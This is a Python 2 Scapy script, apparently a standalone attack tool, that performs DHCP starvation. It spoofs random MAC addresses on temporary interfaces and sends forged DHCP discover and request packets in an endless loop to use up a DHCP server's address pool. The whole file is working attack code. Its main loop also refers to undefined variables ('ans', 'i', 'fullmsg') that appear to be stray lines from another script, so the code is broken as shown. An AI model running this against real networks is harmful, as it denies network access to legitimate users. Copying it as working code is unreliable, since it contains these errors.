#!/usr/bin/python
############################################################

from scapy.all import *
import random
import string
import ConfigParser
import binascii
from termcolor import colored
from scapy.layers.l2 import Ether
from scapy.layers.inet import UDP, IP
from scapy.layers.dhcp import DHCP, BOOTP
import datetime

# To stop scapy from checking return packet originating from any packet that we have sent out
conf.checkIPaddr=False

# Disable default scapy output
conf.verb = 0

# Configuration
config = ConfigParser.ConfigParser()
config.read("dhcp-starvation.conf")

temp_interface = config.get("dhcp-starvation-config", "temp_interface")
temp_netmask = config.get("dhcp-starvation-config", "temp_netmask")

# Static
broadcast_mac = 'ff:ff:ff:ff:ff:ff'
letters = string.ascii_lowercase

# Header
print '###[ DHCP Starvation ]###'
print '###[ Version 0.3 ]###'
print '###[ Date 18/11/2019 ]###'
print '###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###'
print ''

def log_timestamp():
    return colored(datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S"), 'grey')

def bougus_mac():
    temp_mac = str(RandMAC())
    #faixed fist MAC Session to a Even Number
    temp_mac_split = list(temp_mac)
    temp_mac_split[0] = "1";
    temp_mac_split[1] = "0";
    temp_mac = ''.join(temp_mac_split)
    return temp_mac

def up_temp_interface(j, mac):
    a = random.randint(1, 255)
    b = random.randint(1, 255)
    command = 'ifconfig ' + temp_interface + ':' + str(j) + ' hw ether ' + mac + ' ' + '1.2.' + str(a) + '.' + str(b) + ' netmask ' + temp_netmask + ' up'
    print '###[ '+ log_timestamp() + ' Interface: ' + command + ' ]###'
    os.system(command)

def down_temp_interface(j):
    os.system('ifconfig '+ temp_interface + ':' + str(j) + ' down')

def dhcp_discovery (my_mac,j):
    # Craft DHCP Discover
    ethernet = Ether(src=my_mac,dst=broadcast_mac)
    ip = IP(src="0.0.0.0", dst='255.255.255.255')
    udp = UDP(sport=68,dport=67)
    bootp = BOOTP(chaddr=my_mac,xid = RandInt())
    dhcp = DHCP(options=[('message-type', 'discover'), 'end'])
    dhcp_discover_packet = ethernet / ip / udp / bootp / dhcp
    #print dhcp_discover_packet.summary()
    #print dhcp_discover_packet.display()
    # Send Discover Packet
    dhcp_offer = srp1(dhcp_discover_packet,iface=temp_interface + ':' + str(j))
    #########################
    return dhcp_offer

def dhcp_atack(j):
    temp_mac = bougus_mac()
    raw_temp_mac = binascii.unhexlify(temp_mac.replace(":", ""))
    hostname = ''.join(random.choice(letters) for i in range(10))
    up_temp_interface(j,temp_mac)
    #DISCOVERY
    print '###[ '+ log_timestamp() + ' Discover with MAC ' + temp_mac + ' ]###'
    dhcp_offer = dhcp_discovery(temp_mac, j)
    #OFFER
    #print dhcp_offer.summary()
    #print dhcp_offer.display()
    my_ip = dhcp_offer[BOOTP].yiaddr
    print '###[ '+ log_timestamp() + ' Offer Received ' + temp_mac + ' ' + colored(my_ip, 'blue') + ' from ' + dhcp_offer[IP].src + ' ]###'
    #REQUEST
    ethernet = Ether(src=temp_mac, dst=broadcast_mac)
    ip = IP(src='0.0.0.0', dst='255.255.255.255')
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=temp_mac,xid = RandInt())
    dhcp = DHCP(options=[('message-type','request'),
        ('server_id', dhcp_offer[IP].src),
        ('client_id', str2mac(raw_temp_mac)),
        ('hostname', hostname),
        ('vendor_class_id', 'MSFT 5.0'),
        ('client_FQDN', hostname),
        ('requested_addr', my_ip),
        'end'])
    dhcp_request = ethernet / ip / udp / bootp / dhcp
    print '###[ '+ log_timestamp() + ' Requesting ' + temp_mac + ' ' + my_ip + ' ]###'
    dhcp_awswer = srp1(dhcp_request)
    #print dhcp_awswer.display()
    status = 'Unknow'
    message = ' '
    for i in dhcp_awswer[DHCP].options:
        if i[0] == 'message-type':
            if i[1] == 1:
                status = "Discover"
            if i[1] == 2:
                status = "Offer"
            if i[1] == 3:
                status = "Request"
            if i[1] == 4:
                status = "Decline"
            if i[1] == 5:
                status = colored('Ack', 'green')
            if i[1] == 6:
                status = colored('Nac', 'red')
            if i[1] == 7:
                status = "Release"
            if i[1] == 8:
                status = "Inform"
            if i[1] == 9:
                status = "Force Renew"
            if i[1] == 10:
                status = "lease Query"
            if i[1] == 11:
                status = "Lease Unassigned"
            if i[1] == 12:
                status = "Lease Unknown"
            if i[1] == 13:
                status = "Lease Active"
        if i[0] == 'error_message':
            message = i[1]
    print '###[ '+ log_timestamp() + ' DHCP Status: ' + colored(status, 'blue') + ' | Message: ' + colored(message,'blue') + ' ]###'
    down_temp_interface(j)
    #print dhcp_request.packet_Offer.summary()
    #print dhcp_request.packet_Offer.display()
    #time.sleep(0.1)
    #raw_input("Press Enter to continue...")
    print ' '

j = 10
k = 0
while True:
    if ans is not None:
        print("%d: %s" % (i, ans[IP].src))
    else:
        print("%d: Timeout waiting for %s" % (i, fullmsg[IP].dst))
    k = k+1
    j = j+1
    if j == 255:
        j = 10
    l = colored(str(k), 'green')
    print '###[ '+ log_timestamp() + ' Interaction Number ' + l + ' ]###'
    dhcp_atack(j)